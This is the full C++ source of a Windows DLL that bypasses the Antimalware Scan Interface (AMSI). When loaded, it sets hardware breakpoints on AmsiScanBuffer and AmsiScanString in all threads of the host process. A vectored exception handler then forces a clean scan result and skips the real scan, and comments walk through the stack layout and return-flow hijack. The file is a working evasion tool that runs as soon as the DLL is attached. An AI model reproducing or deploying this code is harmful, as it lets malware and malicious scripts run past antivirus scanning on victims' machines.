#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define STATUS_SINGLE_STEP 0x80000004

namespace AmsiBypass {

    struct Context {
        PVOID AmsiScanBufferAddr;
        PVOID AmsiScanStringAddr;
        PVOID VehHandlerAddr;
        DWORD InterceptCount;
        BOOL Initialized;
    };

    static Context g_Ctx = { 0 };

    VOID SetHwBp(PCONTEXT Ctx, PVOID Addr, int Index) {
        DWORD64* DebugRegs[] = { &Ctx->Dr0, &Ctx->Dr1, &Ctx->Dr2, &Ctx->Dr3 };
        if (Index >= 0 && Index < 4) {
            *DebugRegs[Index] = (DWORD64)Addr;
        }

        Ctx->Dr7 |= (1ULL << (Index * 2));
        Ctx->Dr7 &= ~(0xFULL << (16 + (Index * 4)));
        Ctx->Dr6 = 0;
    }

    DWORD64 ReadStackValue(DWORD64 StackPtr, DWORD Offset) {
        DWORD64 Value = 0;
        __try {
            Value = *(DWORD64*)(StackPtr + (Offset * 8));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return 0;
        }
        return Value;
    }

    DWORD64 ReadStackValueByteOffset(DWORD64 StackPtr, DWORD ByteOffset) {
        DWORD64 Value = 0;
        __try {
            Value = *(DWORD64*)(StackPtr + ByteOffset);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return 0;
        }
        return Value;
    }

    VOID PoisonScanResult(PCONTEXT Ctx) {
        // Why do we read from [rsp + 0x20]?
        //
        // AmsiScanBuffer has 5 parameters:
        //   RCX = amsiContext   (1st argument)
        //   RDX = buffer        (2nd argument)
        //   R8  = length        (3rd argument)
        //   R9  = name          (4th argument)
        //   [rsp+0x20] = result pointer (5th argument)
        //
        // Windows x64 calling convention:
        // - First 4 args go into RCX/RDX/R8/R9
        // - 5th argument goes on the stack AFTER 32 bytes of shadow space
        //
        // Stack layout *before the function prologue runs*:
        //
        //    [rsp+00] = return address
        //    [rsp+08] = shadow space
        //    [rsp+10] = shadow space
        //    [rsp+18] = shadow space
        //    [rsp+20] = *** 5th parameter = AMSI_RESULT* result ***
        //
        // The hardware breakpoint triggers on the FIRST instruction of
        // AmsiScanBuffer, BEFORE 'push rdi' or 'sub rsp,70' happen.
        // So RSP is still pointing at the CALL frame.
        //
        // Therefore, [rsp + 0x20] reliably contains the result pointer.
        
        DWORD64 ScanResultPtr = ReadStackValueByteOffset(Ctx->Rsp, 0x20);
        printf("[AMSI Bypass] PoisonScanResult: Read result pointer from [rsp+0x20] = 0x%p\n", (PVOID)ScanResultPtr);

       if (ScanResultPtr) {
           __try {
                if (!IsBadWritePtr((LPVOID)ScanResultPtr, 4)) {
                    *(DWORD*)ScanResultPtr = 0;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                
            }

            Ctx->R8 = 0;
            Ctx->R9 = 0;
        }
    }

    VOID ModifyReturnFlow(PCONTEXT Ctx) {
        /*
         * why we change return flow like this?
         * 
         * normal AmsiScanBuffer return look like:
         *   00007FFB30778207 | B8 57000780    | mov eax,80070057    | error code if fail
         *   00007FFB3077820C | 4C:8D5C24 70   | lea r11,qword ptr ss:[rsp+70] | fix stack
         *   00007FFB30778225 | C3             | ret                            | go back to caller
         * 
         * normal return: RAX = 0 (success) or RAX = 0x80070057 (bad param)
         * 
         * what we do instead:
         * 1. read return address from [rsp+0x00] - CALL instruction put it there
         * 2. set RIP = return address - jump straight to caller code, skip function
         * 3. RSP += 8 - fake RET instruction (pop return address from stack)
         * 4. RAX = 0 - make it look like success return
         * 
         * so we skip whole AmsiScanBuffer function, never run it
         * but caller think function return success with clean result
         * 
         * IMPORTANT: this work for AMSI because function return simple
         * if function have local variables or SEH handlers, might crash
         * because we dont clean stack properly, just jump away
         */

        DWORD64 RetAddr = ReadStackValue(Ctx->Rsp, 0);

       if (RetAddr) {
           if (RetAddr >= 0x10000 && RetAddr < 0x7FFFFFFFFFFF) {
                Ctx->Rip = RetAddr;
                Ctx->Rsp += 8;
                Ctx->Rax = 0;
            }
        }
    }

    LONG CALLBACK VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
        /*
         * VEH handler - why this works?
         * 
         * when hardware breakpoint hit on AmsiScanBuffer/AmsiScanString:
         * 1. CPU raise STATUS_SINGLE_STEP (0x80000004) BEFORE run instruction
         * 2. Windows call our VEH handler FIRST (before SEH handlers)
         * 3. we get EXCEPTION_POINTERS with all CPU registers (RIP, RSP, RAX, etc)
         * 4. we can change context and make execution go different place
         * 
         * this happen at FIRST instruction of function (before prologue run)
         * so we can read params from stack at original position
         * after prologue, stack change and we cant read params anymore
         */
        
        if (ExceptionInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP) {
            return EXCEPTION_CONTINUE_SEARCH;
        }

        PVOID ExceptionAddr = ExceptionInfo->ExceptionRecord->ExceptionAddress;
        PCONTEXT Ctx = ExceptionInfo->ContextRecord;
        if (ExceptionAddr == g_Ctx.AmsiScanBufferAddr || ExceptionAddr == g_Ctx.AmsiScanStringAddr) {
            g_Ctx.InterceptCount++;

            PoisonScanResult(Ctx);
            ModifyReturnFlow(Ctx);

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        return EXCEPTION_CONTINUE_SEARCH;
    }

    DWORD WINAPI InitializeThread(LPVOID Param) {
        Sleep(500);

        if (g_Ctx.Initialized)
            return 0;

        HMODULE AMSIII = GetModuleHandleA("amsi.dll");
        if (!AMSIII) {
            AMSIII = LoadLibraryA("amsi.dll");
            if (!AMSIII) //shouldnt happen btw
            return 1;
        }

        g_Ctx.AmsiScanBufferAddr = GetProcAddress(AMSIII, "AmsiScanBuffer");
        g_Ctx.AmsiScanStringAddr = GetProcAddress(AMSIII, "AmsiScanString");

        if (!g_Ctx.AmsiScanBufferAddr && !g_Ctx.AmsiScanStringAddr)
         return 1;

        g_Ctx.VehHandlerAddr = AddVectoredExceptionHandler(1, VehHandler);
        if (!g_Ctx.VehHandlerAddr)
        return 1;

        HANDLE HSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (HSnapshot == INVALID_HANDLE_VALUE) 
           return 1;

        THREADENTRY32 Te = { 0 };
        Te.dwSize = sizeof(THREADENTRY32);

        DWORD CurrentPid = GetCurrentProcessId();
        int ThreadsPatched = 0;

        if (Thread32First(HSnapshot, &Te)) {
            do {
                if (Te.th32OwnerProcessID == CurrentPid) {
                    HANDLE HThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, Te.th32ThreadID);
                    if (HThread) {
                        CONTEXT ThreadContext = { 0 };
                        ThreadContext.ContextFlags = CONTEXT_DEBUG_REGISTERS;

                        if (GetThreadContext(HThread, &ThreadContext)) {
                            if (g_Ctx.AmsiScanBufferAddr) {
                                SetHwBp(&ThreadContext, g_Ctx.AmsiScanBufferAddr, 0);
                            }
                            if (g_Ctx.AmsiScanStringAddr) {
                                SetHwBp(&ThreadContext, g_Ctx.AmsiScanStringAddr, 1);
                            }

                            if (SetThreadContext(HThread, &ThreadContext)) {
                                ThreadsPatched++;
                            }
                        }

                        CloseHandle(HThread);
                    }
                }
            } while (Thread32Next(HSnapshot, &Te));
        }

        CloseHandle(HSnapshot);

        g_Ctx.Initialized = TRUE;

        return 0;
    }

    BOOL Initialize() {
        HANDLE HThread = CreateThread(NULL, 0, InitializeThread, NULL, 0, NULL);
        if (HThread) {
            CloseHandle(HThread);
            return TRUE;
        }
        return FALSE;
    }

    VOID Cleanup() {
        if (g_Ctx.VehHandlerAddr) {
            RemoveVectoredExceptionHandler(g_Ctx.VehHandlerAddr);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD Reason, LPVOID Reserved) {
    switch (Reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        AmsiBypass::Initialize();
        break;

    case DLL_PROCESS_DETACH:
        AmsiBypass::Cleanup();
        break;
    }
    return TRUE;
}